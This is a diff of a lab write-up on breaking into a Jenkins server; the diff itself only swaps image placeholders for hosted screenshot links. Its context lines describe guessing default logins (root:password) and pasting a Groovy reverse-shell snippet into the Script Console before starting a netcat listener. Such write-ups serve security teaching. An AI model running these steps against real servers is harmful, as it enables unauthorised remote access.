@@ -37,15 +37,15 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Visiting the website on port 8080, I found a `Jenkins Login Page`. So I tried entering common username and password combination to see if I could bypass the login page (admin:password, admin:admin, root:root) 
 
-pw-1
+![pw-1](https://user-images.githubusercontent.com/87711310/214796032-93ca6d38-a204-46a2-a785-9c97e41d7f52.png)
 
 And luckily after a few tries I was able to login in using `root:password` as credentials.
 
-pw-2
+![pw-2](https://user-images.githubusercontent.com/87711310/214796048-c2b27452-de0c-409b-b912-a447d33f1d6b.png)
 
 After looking around the website for a while, we find this interesting section of the website:
 
-pw-3
+![pw-3](https://user-images.githubusercontent.com/87711310/214796056-8e16f2f7-f140-4d4c-b1d9-1264b31523e5.png)
 
 To get there, click on `Manage Jenkins` on the left pane, then scroll down all the way to the bottom of the page and click on `Script Console`. 
 
@@ -59,7 +59,7 @@ String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(tru
 
 Copy paste the code above to the Script Console section of the website. This should look something like this:
 
-pw-4
+![pw-4](https://user-images.githubusercontent.com/87711310/214796061-b3f71ab8-e04b-44b4-b4af-ee355b82fe99.png)
 
 Started a netcat listener on my machine
 ```
